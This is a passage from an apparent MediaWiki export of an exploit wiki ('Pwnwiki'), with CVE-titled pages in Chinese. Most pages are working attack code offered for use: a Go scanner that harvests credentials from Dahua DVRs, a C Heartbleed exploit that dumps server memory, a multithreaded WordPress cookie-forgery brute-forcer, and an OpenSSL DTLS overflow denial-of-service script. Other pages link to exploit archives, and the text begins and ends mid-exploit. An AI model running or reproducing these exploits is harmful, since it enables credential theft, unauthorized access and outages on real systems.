# Write out our malicious file
writeFile = open ("maliciousJOP.ico", "wb")
writeFile.write( payload )
writeFile.close()
&lt;/pre&gt;</text>
      <sha1>o8v39hzeyu4r12y9kuv4v0qkm3ubtvh</sha1>
    </revision>
  </page>
  <page>
    <title>CVE-2013-5842 Oracle Java SE 7u40 漏洞</title>
    <ns>0</ns>
    <id>780</id>
    <revision>
      <id>1028</id>
      <timestamp>2021-04-06T03:05:10Z</timestamp>
      <contributor>
        <username>Pwnwiki</username>
        <id>1</id>
      </contributor>
      <comment>Created page with "==EXP== https://github.com/JustYoomoon/Exploit/blob/main/CVE-2013-5842.zip"</comment>
      <origin>1028</origin>
      <model>wikitext</model>
      <format>text/x-wiki</format>
      <text bytes="74" sha1="af0cjndhf591l8f8tqgunerzx5h5niq" xml:space="preserve">==EXP==
https://github.com/JustYoomoon/Exploit/blob/main/CVE-2013-5842.zip</text>
      <sha1>af0cjndhf591l8f8tqgunerzx5h5niq</sha1>
    </revision>
  </page>
  <page>
    <title>CVE-2013-6117 Dahua DVR 2.608.0000.0 and 2.608.GV00.0 身份驗證繞過漏洞</title>
    <ns>0</ns>
    <id>781</id>
    <revision>
      <id>1029</id>
      <timestamp>2021-04-06T03:08:25Z</timestamp>
      <contributor>
        <username>Pwnwiki</username>
        <id>1</id>
      </contributor>
      <comment>Created page with "==Usage== &lt;pre&gt; $ ./CVE-2013-6117 -h Options:    -h, --help       display help information   -f, --filename   File containing list of IP addresses   -t, --target     Target IP..."</comment>
      <origin>1029</origin>
      <model>wikitext</model>
      <format>text/x-wiki</format>
      <text bytes="4340" sha1="1723kzkhw3j0xd1stej4s84nglj9yrm" xml:space="preserve">==Usage==
&lt;pre&gt;
$ ./CVE-2013-6117 -h
Options:

  -h, --help       display help information
  -f, --filename   File containing list of IP addresses
  -t, --target     Target IP
  -n, --threads    No of concurrent threads (default: 100)
&lt;/pre&gt;

&lt;pre&gt;
$ ./CVE-2013-6117 -f hostfile.txt 
1.2.4.4|name.no-ip.org:80|username|password
&lt;/pre&gt;

&lt;pre&gt;
$ ./CVE-2013-6117 -t 1.2.3.4
1.2.4.4|name.no-ip.org:80|username|password
&lt;/pre&gt;



==CVE-2013-6117.go==
&lt;pre&gt;
package main
import (
    "net"
    "os"
    "strings"
    "fmt"
    "sync"
    "bufio"
    "time"
    "github.com/mkideal/cli"
)
func readLines(path string) ([]string, error) {
  file, err := os.Open(path)
  if err != nil {
    return nil, err
  }
  defer file.Close()

  var lines []string
  scanner := bufio.NewScanner(file)
  for scanner.Scan() {
    lines = append(lines, scanner.Text())
  }
  return lines, scanner.Err()
}
func getData(servAddr string,data string) {
	tmpResult:=data
	if strings.Contains(tmpResult, "&amp;&amp;G4-IP DDNS&amp;&amp;"){
		s := strings.Split(tmpResult, "&amp;&amp;G4-IP DDNS&amp;&amp;")
		if  len(s)&gt;0 {
			s := strings.Split(tmpResult, "&amp;&amp;G4-IP DDNS&amp;&amp;")[1]
			s1 := strings.Split(s, "&amp;&amp;")
			tmpip:=s1[0]
			tmpport:=s1[1]	
			ddns:=tmpip+":"+tmpport
			tmpusername:=s1[3]
			tmppassword:=s1[4]
			if len(tmpusername)&gt;0 {
				fmt.Println(servAddr+"|"+ddns+"|"+tmpusername+"|"+tmppassword)
			}			
		}
	}	
	if strings.Contains(tmpResult, "&amp;&amp;NO-IP DDNS&amp;&amp;"){
		s := strings.Split(tmpResult, "&amp;&amp;NO-IP DDNS&amp;&amp;")
		if  len(s)&gt;0 {
			s := strings.Split(tmpResult, "&amp;&amp;NO-IP DDNS&amp;&amp;")[1]
			s1 := strings.Split(s, "&amp;&amp;")
			tmpip:=s1[0]
			tmpport:=s1[1]	
			ddns:=tmpip+":"+tmpport
			tmpusername:=s1[3]
			tmppassword:=s1[4]
			if len(tmpusername)&gt;0 {
				fmt.Println(servAddr+"|"+ddns+"|"+tmpusername+"|"+tmppassword)
			}			
		}
	}	
	if strings.Contains(tmpResult, "&amp;&amp;Dyndns DDNS&amp;&amp;"){
		s := strings.Split(tmpResult, "&amp;&amp;Dyndns DDNS&amp;&amp;")
		if  len(s)&gt;0 {
			s := strings.Split(tmpResult, "&amp;&amp;Dyndns DDNS&amp;&amp;")[1]
			s1 := strings.Split(s, "&amp;&amp;")
			tmpip:=s1[0]
			tmpport:=s1[1]	
			ddns:=tmpip+":"+tmpport
			tmpusername:=s1[3]
			tmppassword:=s1[4]
			if len(tmpusername)&gt;0 {
				fmt.Println(servAddr+"|"+ddns+"|"+tmpusername+"|"+tmppassword)
			}		
		}
	}
}
func connect(urlChan chan string) {
    for servAddr := range urlChan {
		strEcho := "\xa3\x00\x00\x00\x00\x00\x00\x00\x63\x6f\x6e\x66\x69\x67\x00\x00\x8c\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00"
		tcpAddr, err := net.ResolveTCPAddr("tcp", servAddr+":37777")
		if err == nil {
			var timeoutSec=5
			timeout := time.Duration(time.Duration(timeoutSec) * time.Second)
		
			d := net.Dialer{Timeout: timeout}
			conn, err := d.Dial("tcp", servAddr+":37777")    	
		
			if err == nil {
				_, err = conn.Write([]byte(strEcho))
				if err == nil {
					reply := make([]byte, 1024)
					_, err = conn.Read(reply)
					if err == nil {
						getData(servAddr,string(reply))
					}

				}
				conn.Close()
			} 
		}
		_=tcpAddr
	}
}
type argT struct {
	cli.Helper
	Filename string `cli:"f,filename" usage:"File containing list of IP addresses"`
	Targetip string `cli:"t,target" usage:"Target IP"`
	Threads int  `cli:"n,threads" usage:"No of concurrent threads (default: 100)"`
}

func main() {
    var workersCount=100
	var contentList []string
	cli.Run(new(argT), func(ctx *cli.Context) error {
		argv := ctx.Argv().(*argT)
		if len(argv.Filename)&gt;0 {
			lines, err2 := readLines(argv.Filename)
			if err2==nil {
				for _, v := range lines {
					v=strings.TrimSpace(v)
					if len(v)&gt;0 {
						contentList = append(contentList, v)
					}
				}		
			} else {
				fmt.Println(err2)
			}
			_ = err2				
		}
		if argv.Threads&gt;0 {
			workersCount=argv.Threads
		}
		if len(argv.Targetip)&gt;0 {
			contentList = append(contentList, argv.Targetip)
		}

		return nil
	})
	urlChan := make(chan string)
	var wg1 sync.WaitGroup
	wg1.Add(workersCount)

	for i := 0; i &lt; workersCount; i++ {
		go func() {
  			defer wg1.Done()
  			connect(urlChan)
		}()
	}

	completed := 0
	for _, each := range contentList {
		urlChan &lt;- each
		completed++
	}
	close(urlChan)	
	wg1.Wait()    
}

&lt;/pre&gt;


==goreleaser.yml==
&lt;pre&gt;
build:
  main: ./CVE-2013-6117.go
  goos:
    - linux
    - darwin
    - windows
  goarch:
    - 386
    - amd64
    - arm
    - arm64
brew:
  github:
    owner: milo2012
    name: homebrew-tap
  folder: Formula

&lt;/pre&gt;</text>
      <sha1>1723kzkhw3j0xd1stej4s84nglj9yrm</sha1>
    </revision>
  </page>
  <page>
    <title>CVE-2014-0038 Linux kernel before 3.13.2特權提升漏洞</title>
    <ns>0</ns>
    <id>799</id>
    <revision>
      <id>1056</id>
      <timestamp>2021-04-07T02:39:39Z</timestamp>
      <contributor>
        <username>Pwnwiki</username>
        <id>1</id>
      </contributor>
      <comment>Created page with "==EXP== https://github.com/JustYoomoon/Exploit/blob/main/cve-2014-0038.zip"</comment>
      <origin>1056</origin>
      <model>wikitext</model>
      <format>text/x-wiki</format>
      <text bytes="74" sha1="ktm02rjiz3d2h067cn7cqi98h6fi2wa" xml:space="preserve">==EXP==
https://github.com/JustYoomoon/Exploit/blob/main/cve-2014-0038.zip</text>
      <sha1>ktm02rjiz3d2h067cn7cqi98h6fi2wa</sha1>
    </revision>
  </page>
  <page>
    <title>CVE-2014-0050 Apache Commons FileUpload before 1.3.1 拒絕服務漏洞</title>
    <ns>0</ns>
    <id>800</id>
    <revision>
      <id>1057</id>
      <timestamp>2021-04-07T02:42:12Z</timestamp>
      <contributor>
        <username>Pwnwiki</username>
        <id>1</id>
      </contributor>
      <comment>Created page with "==EXP== https://github.com/JustYoomoon/Exploit/blob/main/cve-2014-0050.zip"</comment>
      <origin>1057</origin>
      <model>wikitext</model>
      <format>text/x-wiki</format>
      <text bytes="74" sha1="1kt3oiduz1qwhuoyya0oc0qif1qacv7" xml:space="preserve">==EXP==
https://github.com/JustYoomoon/Exploit/blob/main/cve-2014-0050.zip</text>
      <sha1>1kt3oiduz1qwhuoyya0oc0qif1qacv7</sha1>
    </revision>
  </page>
  <page>
    <title>CVE-2014-0094 Apache Struts before 2.3.16.2 遠程攻擊漏洞</title>
    <ns>0</ns>
    <id>801</id>
    <revision>
      <id>1058</id>
      <timestamp>2021-04-07T02:44:24Z</timestamp>
      <contributor>
        <username>Pwnwiki</username>
        <id>1</id>
      </contributor>
      <comment>Created page with "==EXP== https://github.com/JustYoomoon/Exploit/blob/main/CVE-2014-0094.zip"</comment>
      <origin>1058</origin>
      <model>wikitext</model>
      <format>text/x-wiki</format>
      <text bytes="74" sha1="pwj4tbfrx9i54dksxy49au57v1o8ek1" xml:space="preserve">==EXP==
https://github.com/JustYoomoon/Exploit/blob/main/CVE-2014-0094.zip</text>
      <sha1>pwj4tbfrx9i54dksxy49au57v1o8ek1</sha1>
    </revision>
  </page>
  <page>
    <title>CVE-2014-0130 Rails before 3.2.18, 4.0.x before 4.0.5, and 4.1.x before 4.1.1 任意文件讀取漏洞</title>
    <ns>0</ns>
    <id>802</id>
    <revision>
      <id>1059</id>
      <timestamp>2021-04-07T02:47:21Z</timestamp>
      <contributor>
        <username>Pwnwiki</username>
        <id>1</id>
      </contributor>
      <comment>Created page with "==EXP== https://github.com/JustYoomoon/Exploit/blob/main/cve-2014-0130.zip"</comment>
      <origin>1059</origin>
      <model>wikitext</model>
      <format>text/x-wiki</format>
      <text bytes="74" sha1="rruomcm4by63gb7pp9vs28fzjx8tyjo" xml:space="preserve">==EXP==
https://github.com/JustYoomoon/Exploit/blob/main/cve-2014-0130.zip</text>
      <sha1>rruomcm4by63gb7pp9vs28fzjx8tyjo</sha1>
    </revision>
  </page>
  <page>
    <title>CVE-2014-0160 OpenSSL 1.0.1 before 1.0.1g 敏感信息泄漏漏洞</title>
    <ns>0</ns>
    <id>804</id>
    <revision>
      <id>1061</id>
      <timestamp>2021-04-07T02:50:11Z</timestamp>
      <contributor>
        <username>Pwnwiki</username>
        <id>1</id>
      </contributor>
      <comment>Created page with "==Usage== &lt;pre&gt;    ./cve-2014-160 dvwa.local https &amp;&amp; strings data_dump.bin &lt;/pre&gt;  ==EXP== &lt;pre&gt; #include &lt;stdio.h&gt; #include &lt;errno.h&gt; #include &lt;sys/types.h&gt; #include &lt;stdint..."</comment>
      <origin>1061</origin>
      <model>wikitext</model>
      <format>text/x-wiki</format>
      <text bytes="6832" sha1="3mfqgs5ypu2daamkutxaixzfyn6nscj" xml:space="preserve">==Usage==
&lt;pre&gt;
   ./cve-2014-160 dvwa.local https &amp;&amp; strings data_dump.bin
&lt;/pre&gt;

==EXP==
&lt;pre&gt;
#include &lt;stdio.h&gt;
#include &lt;errno.h&gt;
#include &lt;sys/types.h&gt;
#include &lt;stdint.h&gt;
#include &lt;sys/stat.h&gt;
#include &lt;fcntl.h&gt;
#include &lt;sys/socket.h&gt;
#include &lt;netinet/in.h&gt;
#include &lt;arpa/inet.h&gt;
#include &lt;netdb.h&gt;
#include &lt;openssl/ssl.h&gt;

void wait_server_helo_done(int s);
int write_down(char *src, int len, char *fname);
int connect_target(const char *name, const char *port);

/* TYPES: */
struct helo_message {
  uint8_t handshake_type;
  uint8_t length[3];
  /* anything more? */
} __attribute__ ((packed));

struct ext_hb {
  uint16_t type;
  uint16_t length;
  uint8_t  mode;
} __attribute__ ((packed));

struct helo_message_client {
  struct helo_message helo_message;
  uint16_t version;
  uint32_t timestamp;
  uint8_t random[28];
  uint8_t sessid_length;
  uint16_t cipher_suites;
  uint16_t ciphers[16];
  uint8_t compression_method_cnt;
  uint8_t compression_methods[1];
  uint16_t extensions_length;
  struct ext_hb extension_hb;
} __attribute__ ((packed));

struct heartbeat_message {
  uint8_t type;
  uint16_t length;
  uint8_t payload[2];
  uint8_t padding[16];
}  __attribute__ ((packed));


struct tls_generic_message {
  uint8_t content_type;
  uint16_t version;
  uint16_t length;
} __attribute__ ((packed));


struct tls_received_message {
  struct tls_generic_message message;
  uint8_t payload[0x4000 - sizeof(struct tls_generic_message)];
};

struct tls_message_helo_client {
  struct tls_generic_message message;
  struct helo_message_client payload;
} __attribute__ ((packed));

struct tls_message_heartbeat {
  struct tls_generic_message message;
  struct heartbeat_message payload;
} __attribute__ ((packed));

/* TYPES END */



int main(int argc, char **argv)
{
/* DATA: */  
  char *name = "127.0.0.1";
  char *port = "https";

  struct tls_message_helo_client client_hlo = {
    .message = {
      22,     /* handshake message*/
      0x0103, /* protocol version 3.1 */
      htons(sizeof(struct helo_message_client)),
    },
    .payload = {
      .helo_message = {
	.handshake_type = 1, /* Client helo */
	.length = {0,0, sizeof(struct helo_message_client) - sizeof(struct helo_message)},
      },
      .version = 0x0103,   /* TLS 1.0 */
      .timestamp = 0x69624553,
      .random = "Fuck you asshole! Fuck you!",
      .sessid_length = 0,
      .cipher_suites = 0x2000, /* 0x0020 in network order */
      .ciphers = {0x14c0,0x0ac0,0x22c0,0x21c0,0x3900,0x3800,0x8800,0x8700,0x0fc0,0x05c0,0x3500,0x8400,0x12c0,0x08c0,0x1cc0,0x1bc0},
      .compression_method_cnt = 1,
      .compression_methods = {0},
      .extensions_length = 0x0500,
      .extension_hb = {0x0f00, 0x0100, 1}
    }
  };

  struct tls_message_heartbeat hb = {
    .message = {
      .content_type = 24,     /* heartbeat message */
      .version = 0x0103, /* protocol version 3.1 */
      .length = htons(sizeof(struct heartbeat_message))
    },
    .payload = {
      1,
      htons(0x4000 - sizeof(struct heartbeat_message))
    }
  };
  /* DATA END. */

  if (argc &gt; 1)
    name = argv[1];

  if (argc &gt; 2)
    port = argv[2];

  int s = connect_target(name, port);

  int bt = write(s, &amp;client_hlo, sizeof(client_hlo));
  printf("Client helo: sent %d bytes\n", bt);

  wait_server_helo_done(s);

  bt = write(s, &amp;hb, sizeof(hb));
  printf("Client heartbeat: sent %d bytes\n", bt);

  /* Now we need to read heartbeat answer of len bytes. */
  unsigned char buf[65535];
  bt = recv(s, buf, sizeof(buf), 0);
  if (-1 == bt) {
    printf("Cannot read: %s\n", strerror(errno));
    exit(5);
  }
  if (0 == bt) {
    printf("Server closed connection\n");
    exit(5);
  }


  printf("%d bytes received from host\n", bt);

  write_down(buf, bt, "data_dump.bin");

  return 0;

}




int connect_target(const char *name, const char *port)
{
  int s = socket(AF_INET, SOCK_STREAM, 0);

  if (-1 == s) {
    printf("Cannot create socket.\n");
    exit(1);
  }

  struct addrinfo hints = {0};
  hints.ai_family = AF_INET;
  hints.ai_socktype = SOCK_STREAM;
  
  struct addrinfo *endpoint;
  int result = getaddrinfo(name, port, &amp;hints, &amp;endpoint);

  if (result) {
    printf("Cannot reoslve address: %s:%s: %s\n", name, port, gai_strerror(result));
    exit(1);
  }
  
  do {

    struct sockaddr_in *a = (struct sockaddr_in *)endpoint-&gt;ai_addr;

    printf("trying to connect: %s\n", inet_ntoa(a-&gt;sin_addr));
    result = connect(s, endpoint-&gt;ai_addr, endpoint-&gt;ai_addrlen);

    if (!result) {
      printf("Connected to: %s:%s (%s:%d)\n",
	     name,
	     port,
	     inet_ntoa(a-&gt;sin_addr),
	     ntohs(a-&gt;sin_port));
      return s;
    }

    printf("Cannot connect to %s: %s\n", inet_ntoa(a-&gt;sin_addr), strerror(errno));
    endpoint = endpoint-&gt;ai_next;
    
  } while(endpoint);

  close(s);
  
  exit(1);
}

int write_down(char *src, int len, char *fname)
{
  int fd = open(fname, O_RDWR|O_TRUNC|O_CREAT, S_IRUSR|S_IWUSR);

  if (-1 == fd) {
    printf("Cannot open %s: %s\n", fname, strerror(errno));
    exit(5);
  }

  int bt = write(fd, src, len);

  if (-1 == bt) {
    printf("Cannot write to %s: %s\n", fname, strerror(errno));
    exit(5);
  }

  close(fd);

  printf("%d bytes written into %s\n", bt, fname);
  
}


int read_message(int s, struct tls_received_message *p_msg)
{
  int bt = read(s, p_msg, sizeof(struct tls_generic_message));
  if (-1 == bt) {
    printf("Cannot read message: %s\n", strerror(errno));
    exit(5);
  }
  if (0 == bt) {
    printf("Server closed connection\n");
    exit(5);
  }

  printf("Message received (%d bytes): message type: %d; ",
	 bt, p_msg-&gt;message.content_type);

  if (22 != p_msg-&gt;message.content_type)
    return 0;
  
  int length = ntohs(p_msg-&gt;message.length);
  if (sizeof(p_msg-&gt;payload) &lt; length)
    length = sizeof(p_msg-&gt;payload);
    
  printf("Message payload is %d bytes (%d)\n", length, ntohs(p_msg-&gt;message.length));
  bt = 0;
  while (bt &lt; length) {
    int readed = read(s, (uint8_t *)&amp;p_msg-&gt;payload + bt, length - bt);
    if (-1 == readed) {
      printf("Cannot read: %s\n", strerror(errno));
      break;
    }
    if (0 == readed) {
      printf("Server closed connection\n");
      break;
    }
    
    bt += readed;
  }
  
  return bt;

}

void wait_server_helo_done(int s)
{
  struct tls_received_message msg;
  struct helo_message *hlo_msg = (struct helo_message *)&amp;msg.payload;
  int bt;
  do {
    bt = read_message(s, &amp;msg);
    if (bt)
      printf("Payload of %d bytes: handshake type: %d\n", bt, hlo_msg-&gt;handshake_type);
    if (ntohs(msg.message.length) &gt; bt) {
      printf("Only %d of %d message bytes received. Aborting.\n", bt, ntohs(msg.message.length));
      break;
    }
    if (hlo_msg-&gt;handshake_type == 14)
      return;
  } while (msg.message.content_type == 22 &amp;&amp; hlo_msg-&gt;handshake_type != 14);

  exit(5);
}

&lt;/pre&gt;</text>
      <sha1>3mfqgs5ypu2daamkutxaixzfyn6nscj</sha1>
    </revision>
  </page>
  <page>
    <title>CVE-2014-0160 OpenSSL Heartbleed漏洞</title>
    <ns>0</ns>
    <id>1408</id>
    <revision>
      <id>1776</id>
      <timestamp>2021-04-20T06:15:43Z</timestamp>
      <contributor>
        <username>Pwnwiki</username>
        <id>1</id>
      </contributor>
      <comment>Created page with "==Tool== https://github.com/drwetter/testssl.sh  ==Usage== &lt;pre&gt; ./testssl.sh -H [domain] &lt;/pre&gt;"</comment>
      <origin>1776</origin>
      <model>wikitext</model>
      <format>text/x-wiki</format>
      <text bytes="96" sha1="f1a7iqfdajdlw13kji7njq97bwbpvzl" xml:space="preserve">==Tool==
https://github.com/drwetter/testssl.sh

==Usage==
&lt;pre&gt;
./testssl.sh -H [domain]
&lt;/pre&gt;</text>
      <sha1>f1a7iqfdajdlw13kji7njq97bwbpvzl</sha1>
    </revision>
  </page>
  <page>
    <title>CVE-2014-0166 WordPress before 3.7.2 and 3.8.x before 3.8.2 僞造Cookie獲得權限漏洞</title>
    <ns>0</ns>
    <id>805</id>
    <revision>
      <id>1062</id>
      <timestamp>2021-04-07T02:53:36Z</timestamp>
      <contributor>
        <username>Pwnwiki</username>
        <id>1</id>
      </contributor>
      <comment>Created page with "==INFO== WordPress &lt; 3.8.2 cookie forgery vulnerability  ===cookieForger.py=== &lt;pre&gt; #!/usr/bin/env python  """ This script is the EXP of CVE-2014-0166. By varying the expirat..."</comment>
      <origin>1062</origin>
      <model>wikitext</model>
      <format>text/x-wiki</format>
      <text bytes="5805" sha1="idzgmdhui5wc2gi55ycq9y9bt8bs9ak" xml:space="preserve">==INFO==
WordPress &lt; 3.8.2 cookie forgery vulnerability

===cookieForger.py===
&lt;pre&gt;
#!/usr/bin/env python

"""
This script is the EXP of CVE-2014-0166.
By varying the expiration value of the cookie, an attacker can find a 'zero hash' to forge a valid cookie. 
However, on average, we need 300 million requets to find a 'zero hash'. 
Therefore I wrote this multithread script.

Details: http://www.ettack.org/wordpress-cookie-forgery/
Author: Ettack
Email: ettack@gmail.com
"""

import requests
import hmac
import threading
from hashlib import md5
from sys import stdout
from time import sleep,ctime,gmtime,time
from os import _exit

initnum = 0 	#Set the initial value here while performing distributed computing.
threadNum = 500
errTolerance = 0 	#If ErrorRequests/AllRequests &gt; errTolerance, then decrease threads number

lock = threading.Lock()

url = 'http://test.com'
user = 'ettack'


expiration = 1400000000+initnum
cnt = 0+initnum


cookie_k = 'wordpress_' + md5(url).hexdigest()

def testCookie(url,user,expr):
	global errcnt
	cookie_v = user + '|' + str(expr) + '|0'
	cookie = {cookie_k:cookie_v}
	try:
		r = requests.head(url + '/wp-admin/',cookies=cookie)
	except requests.exceptions.ConnectionError:
		errcnt += 1
		# print "Connection ERROR occured in %s"%(threading.current_thread())
		sleep(8)
		return "Err"
	statcode = r.status_code
	if statcode == 200: 
		return cookie
	if statcode != 302:
		errcnt += 1
		sleep(5)
		return "Err"
	return False


def action():
	lock.acquire()
	global expiration,cnt
	expiration += 1
	cnt += 1
	stdout.flush()
	stdout.write("\r%s"%(cnt))
	lock.release()
	try:
		#Copy expiration value to expr.As expiration would be increased by other threads.
		expr = expiration
		#Loop until no error
		while True:
			result = testCookie(url,user,expr)
			if result != "Err": break
	except KeyboardInterrupt:
		print "Interrupted at %s"%(expiration)
		_exit(0)
	except Exception,e:
		print e

	#Cookie found! Output to screen and file (wp_result). Output consumed time as well.
	if result != False:
		print "\n\nCongratulations!!! Found valid cookie:"
		print str(result)
		dtime = time()-stime
		timestr = gmtime(dtime)
		print "\nRunning time: %sd %sh %sm %ss"%(timestr.tm_mday-1,timestr.tm_hour,timestr.tm_min,timestr.tm_sec)	
		with open("wp_result","w") as fp:
			fp.write(str(result))
			fp.close()
		_exit(0)


stime = time()
print "Start at %s"%(ctime())
print "Guessing with %d threads...\n"%(threadNum)

#Main part of guessing program
while True:
	threads = []
	errcnt = 0
	
	for i in xrange(threadNum):
		t = threading.Thread(target = action)
		threads.append(t)
		t.start()

	for t in threads:
		t.join()
	
	#Adjust threads number
	errRate = float(errcnt)/threadNum 
	if errRate &gt; errTolerance:
		newThreadNum = int(threadNum * (1-0.5*errRate))
	 	print "\nToo many retries (%d/%d). Automatically decrease to %d threads!"%(errcnt,threadNum+errcnt,newThreadNum)
	 	threadNum = newThreadNum
	#Log process to wp_log
	with open("wp_log","w") as fp:
		fp.write(str(cnt))
		fp.close()




&lt;/pre&gt;


===wp_zero_cookie_generator.php===
&lt;pre&gt;
&lt;?php
/**
* A script to verify (local) WordPress &lt; 3.8.2 cookie forgery vulnerability
* Author:	Ettack
* Email:	ettack@gmail.com
*/

$site_url = 'http://www.ettack.org';	//Used for generating cookie key: 'wordpress_'+hash($site_url)
$user = 'ettack';
$pass_frag = '1234';	//Fragment of your password hash. $pass_frag = substr($user-&gt;user_pass, 8, 4)
$scheme = '';

$unit = 100000000;
$init = empty($argv[1])?0:$argv[1]*$unit;		//Start point. e.g. 2 for 200000000
$exptime = 1400000000+$init;
$cnt = 0+$init;
$max = $init + $unit;

function gen_cookie($site_url,$user,$exptime,$pass_frag,$scheme) {
	$lk = 'E..y-UBzte&gt;Ddu^pF~kFsCPd6zD)%gar?0lBPiki9Kg_M`^&lt;b3&amp;`PtowYZ6V/1sU';	//$auth_key configured in wp-config.php
	$ls = '()_m._cRk}-Uj|tZ9GEZXJFJ}Ab+AT}:T!ug{I*o`PmmJ`4~/ry^:y0H$g:.fpm}';	//$auth_salt configured in wp-config.php

	$key = hash_hmac('md5',$user.$pass_frag.'|'.$exptime,$lk.$ls);
	$hash = hash_hmac('md5',$user.'|'.$exptime,$key);

	return $hash;
}


while ($cnt&lt;$max) {
	$cnt++;
	$exptime++;
	if ($cnt % 10000 == 0) { 
		echo "\rTrying:  ".$exptime;	//real-time status output
	}
	$hs = gen_cookie($site_url,$user,$exptime,$pass_frag,$scheme);
	//when "zero hash" found, output and exit
	if ($hs == "0") {
		echo "\n\nAfter ".$cnt." tries, we found: \n";
		echo "Expiration: ".$exptime."\n";
		echo "Hash: ".$hs."\n";
		echo "Cookie Key: ".'wordpress'.$scheme.md5($site_url).'\n'
		echo "Cookie Value: ".$user.'|'.$exptime.'|'.$hs.'\n'
		break;
	}
}
?&gt;

&lt;/pre&gt;

===zeroCather.py===
&lt;pre&gt;
import re,hmac
from multiprocessing import Process,Value
from sys import stdout


user = 'ettack'
pass_frag = 'u5dr'

pnum = 8
exprstart = 1400000000

def gen_cookie(user,exptime,pass_frag):
    lk = 'dBr|SFMq6`VaOFKw&gt;r~^Npl(-z &amp;OA(9{(W &amp;(?2h&amp;I}v1!V+Kx.m|uV-:z89L72'
    ls = 'a=ec%X&gt;I&gt;#/@z&gt;b);!*Qk*!&amp;zS)@3[wW+o+2@gFz5xK$v&amp;P@kV@I(YkJV4i9&lt;Qp6'
    key = hmac.new(lk+ls,user+pass_frag+'|'+str(exptime)).hexdigest()
    hs = hmac.new(key,user+'|'+str(exptime)).hexdigest()
    return hs

def loop(tid,flag):
    exptime = exprstart+tid
    while flag.value==0:
        if (exptime % 10000 == 0):
            stdout.flush()
            stdout.write("\rTrying:  "+str(exptime))

        hs = gen_cookie(user,exptime,pass_frag)

        if (re.search('^0+e\d*$',hs)):
            print "\n\nAfter "+str(exptime-exprstart)+" tries, we found: \n"
            print "Expiration: "+str(exptime)+"\n"
            print "Hash: "+hs+"\n"
            flag.value = 1

        exptime += pnum


if __name__ == '__main__':
    processes = []
    flag = Value('i',0)
    for i in xrange(pnum):
        p = Process(target=loop,args=(i,flag))
        processes.append(p)
        p.start()

    for p in processes:
        p.join()


&lt;/pre&gt;</text>
      <sha1>idzgmdhui5wc2gi55ycq9y9bt8bs9ak</sha1>
    </revision>
  </page>
  <page>
    <title>CVE-2014-0195 OpenSSL before 0.9.8za, 1.0.0 before 1.0.0m, and 1.0.1 before 1.0.1h 任意代碼&amp;拒絕服務漏洞</title>
    <ns>0</ns>
    <id>806</id>
    <revision>
      <id>1063</id>
      <timestamp>2021-04-07T02:55:07Z</timestamp>
      <contributor>
        <username>Pwnwiki</username>
        <id>1</id>
      </contributor>
      <comment>Created page with "==EXP== &lt;pre&gt; import socket, struct  from optparse import OptionParser  options = OptionParser(usage='%prog server [options]', description='OpenSSL heap overflow PoC (CVE-2014..."</comment>
      <origin>1063</origin>
      <model>wikitext</model>
      <format>text/x-wiki</format>
      <text bytes="1730" sha1="8dl867t7808zv88nvh1zxojeplx2n89" xml:space="preserve">==EXP==
&lt;pre&gt;
import socket, struct

from optparse import OptionParser

options = OptionParser(usage='%prog server [options]', description='OpenSSL heap overflow PoC (CVE-2014-0195)')
options.add_option('-p', '--port', type='int', default=443, help='TCP port to test (default: 443)')


def dos(host,port):

	DTLS_HANDSHAKE = 0x16
	DTLS_CLIENTHELLO = 0x01
	VERSION = 0xfeff

	SIZE1 = 16
	handshake_frag1  = chr(DTLS_CLIENTHELLO)
	handshake_frag1 += "\x00" + struct.pack("&gt;H", SIZE1) # uint24 length;
	handshake_frag1 += "\x00\x00" # uint16 message_seq;
	handshake_frag1 += "\x00\x00\x00" # uint24 fragment_offset;
	handshake_frag1 += "\x00" + struct.pack("&gt;H", SIZE1-1) # uint24 fragment_length;
	handshake_frag1 += "A"*(SIZE1-1)

	SIZE2 = 4098
	handshake_frag2  = chr(DTLS_CLIENTHELLO)
	handshake_frag2 += "\x00" + struct.pack("&gt;H", SIZE2) # uint24 length;
	handshake_frag2 += "\x00\x00" # uint16 message_seq;
	handshake_frag2 += "\x00\x00\x00" # uint24 fragment_offset;
	handshake_frag2 += "\x00" + struct.pack("&gt;H", SIZE2-1)  # uint24 fragment_length;
	handshake_frag2 += "B"*(SIZE2-1)

	record_msg  = chr(DTLS_HANDSHAKE) # ContentType type;
	record_msg += struct.pack("&gt;H", VERSION) # ProtocolVersion version;
	record_msg += struct.pack("&gt;H", 0x00) # uint16 epoch
	record_msg += "\x00"*6 # uint48 sequence_number;
	record_msg += struct.pack("&gt;H", len(handshake_frag1 + handshake_frag2)) # uint16 length;

	data = record_msg + handshake_frag1 + handshake_frag2
	sock = socket.socket(socket.AF_INET, socket.SOCK_DGRAM)

	sock.sendto(data, (host, port))
	print sock.recv(1024)
	sock.close()

if __name__=='__main__':
	opts,args=options.parse_args()
	if len(args)&lt;1:
		options.print_help()
		quit()
	dos(args[0],opts.port)


&lt;/pre&gt;</text>
      <sha1>8dl867t7808zv88nvh1zxojeplx2n89</sha1>
    </revision>
  </page>
  <page>
    <title>CVE-2014-0196 Linux kernel through 3.14.3 特權提升漏洞</title>
    <ns>0</ns>
    <id>807</id>
    <revision>
      <id>1064</id>
      <timestamp>2021-04-07T02:56:42Z</timestamp>
      <contributor>
        <username>Pwnwiki</username>
        <id>1</id>
      </contributor>
      <comment>Created page with "==EXP== &lt;pre&gt; /*  * CVE-2014-0196: Linux kernel &lt;= v3.15-rc4: raw mode PTY local echo race  * condition  *  * Slightly-less-than-POC privilege escalation exploit  * For kernel..."</comment>
      <origin>1064</origin>
      <model>wikitext</model>
      <format>text/x-wiki</format>
      <text bytes="5326" sha1="srmr62p8le6pzozw3z0ihn2mgj2blel" xml:space="preserve">==EXP==
&lt;pre&gt;
/*
 * CVE-2014-0196: Linux kernel &lt;= v3.15-rc4: raw mode PTY local echo race
 * condition
 *
 * Slightly-less-than-POC privilege escalation exploit
 * For kernels &gt;= v3.14-rc1
 *
 * Matthew Daley &lt;mattd@bugfuzz.com&gt;
 *
 * Usage: 
 *   $ gcc cve-2014-0196-md.c -lutil -lpthread
 *   $ ./a.out
 *   [+] Resolving symbols
 *   [+] Resolved commit_creds: 0xffffffff81056694
 *   [+] Resolved prepare_kernel_cred: 0xffffffff810568a7
 *   [+] Doing once-off allocations
 *   [+] Attempting to overflow into a tty_struct...............
 *   [+] Got it :)
 *   # id
 *   uid=0(root) gid=0(root) groups=0(root)
 *
 * WARNING: The overflow placement is still less-than-ideal; there is a 1/4
 * chance that the overflow will go off the end of a slab. This does not
